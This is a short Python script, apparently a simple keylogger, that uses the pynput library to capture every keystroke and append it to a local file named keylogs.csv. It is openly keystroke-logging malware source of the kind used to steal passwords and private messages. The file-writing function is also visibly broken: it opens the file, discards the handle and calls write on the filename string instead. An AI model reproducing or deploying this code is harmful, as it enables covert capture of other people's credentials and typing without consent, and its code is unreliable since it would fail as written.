from pynput import keyboard


def write(file, string_key):
    """
    This function appends each key to the csv file.
    :param file: This is the file being written to.
    :param string_key: This is the key in its string or char form to ensure its stored properly.
    """
    open(file,"a")
    file.write(string_key + "\n")

def on_press(key):
    """
    This tracks the press of keys and then uses the write function to put it in a csv file.
    :param key: The key being pressed.
    """
    try:
        string_key = key.char # Get char for keys
    except AttributeError:
        string_key  = str(key) # This handles space key and other keys that can't be turned into chars

    write("keylogs.csv", string_key) # Save the key into csv file for later use

with keyboard.Listener(on_press = on_press) as listener:
    listener.join()



